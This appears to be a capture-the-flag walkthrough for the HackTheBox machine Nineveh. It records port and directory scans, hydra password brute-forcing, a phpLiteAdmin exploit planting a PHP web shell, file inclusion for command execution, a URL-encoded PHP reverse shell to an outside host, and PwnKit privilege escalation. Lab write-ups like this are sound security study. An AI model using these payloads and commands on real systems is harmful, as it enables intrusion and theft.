![[Pasted image 20240720105615.png]]

Ping
```
ping 10.10.10.43
```
![[Pasted image 20240620160700.png]]

Nmap Default Scan
```
nmap 10.10.10.43 -oN dnmap
```
![[Pasted image 20240620160806.png]]

Nmap Script and Service Scan
```
nmap 10.10.10.43 -sC -sV -A -oN snmap
```
![[Pasted image 20240620161005.png]]

Nmap All Port Scan
```
nmap 10.10.10.43 -p- --open -T5 -oN anmap
```
![[Pasted image 20240620161658.png]]

On port 443
https://10.10.10.43
![[Pasted image 20240620161843.png]]

On Port 80
http://10.10.10.43
![[Pasted image 20240620161740.png]]

Gobuster Scan
```
gobuster dir -u http://10.10.10.43 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,bak,conf -s 200,204,301,302,307,403 -k --status-codes "" -o gobuster.txt
```
![[Pasted image 20240620161624.png]]

http://10.10.10.43/department
![[Pasted image 20240620161757.png]]

Source page
![[Pasted image 20240620162028.png]]
So we can assume the mysql is installed on server and there is a user named **amrois**

Will try to do sql injection using the gathered information
But sql didn't work

Tried brute force with user amrois, no luck

Will try brute force with user admin
Captured login form
![[Pasted image 20240620163851.png]]

Brute force using hydra's http post form
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form '/department/login.php:username=^USER^&password=^PASS^:Invalid Password!'
```
![[Pasted image 20240620164151.png]]
Found valid creds **admin:1q2w3e4r5t**




Successfully logged in as Admin 
![[Pasted image 20240620164438.png]]

Notes
![[Pasted image 20240620165803.png]]

After some enumeration, I can't progress further 

Will Enumerate port 443
```
gobuster dir -u https://10.10.10.43 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,bak,conf -s 200,204,301,302,307,403 -k --status-codes "" -o gobuster443.txt
```
![[Pasted image 20240620165858.png]]

https://10.10.10.43/db
![[Pasted image 20240620170009.png]]
We can see phpLiteAdmin version, will search for any public exploit.

Found one https://www.exploit-db.com/exploits/24044
![[Pasted image 20240620170135.png]]

Before that we need to find password to login, will use hydra this time for https-post-form
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form '/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password.'
```
![[Pasted image 20240620171205.png]]

Logged in as admin
![[Pasted image 20240620171302.png]]

Now will follow the steps in the exploit https://www.exploit-db.com/exploits/24044
![[Pasted image 20240620171355.png]]

Following the steps
![[Pasted image 20240620175521.png]]
Created the database named hack.php and table named pwn and the filed 1

Now have to insert malicious php code to get RCE
```
<?php echo system($_REQUEST ["cmd"]); ?>
<?php echo system($_REQUEST ["cmd"]); ?>
```
![[Pasted image 20240620180014.png]]

 We can RCE Now
```
 http://10.10.10.43/department/manage.php?notes=/ninevehNotes/../../../../../../var/tmp/hack.php&cmd=id
```
![[Pasted image 20240620180907.png]]

Will get reverse shell, using php reverse shell with url enconding
```
10.10.10.43/department/manage.php?notes=/ninevehNotes/../../../../../../var/tmp/hack.php&cmd=php%20-r%20%27%24sock%3Dfsockopen%28%2210.10.14.6%22%2C4444%29%3Bexec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
```
![[Pasted image 20240620181049.png]]

Got reverse shell and upgraded my shell using python
```
rlwrap nc -nvlp 4444
```
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
![[Pasted image 20240620181120.png]]

Can't read user.txt
![[Pasted image 20240620181314.png]]

Will jump to Privilege Escalation......!

We can't see our sudo permissions, it is asking password
![[Pasted image 20240620181440.png]]

Will check for SUID binaries
```
find / -perm -u=s -type f 2>/dev/null
```
![[Pasted image 20240620181556.png]]
We can se pkexec, will check its version

```
pkexec --version
```
![[Pasted image 20240620181707.png]]
Running vulnerable Version, will try PwnKit

Transferring PwnKit to target machine
```
wget 10.10.14.6/PwnKit
```
![[Pasted image 20240620182101.png]]

Change permissions and execute the binary
```
chmod +x PwnKit
```
```
./PwnKit
```
![[Pasted image 20240620182143.png]]
Coool..! We ARe Ro0t

**root.txt**
![[Pasted image 20240620182513.png]]

User.txt
![[Pasted image 20240620182620.png]]


Done with Nineveh.....:)
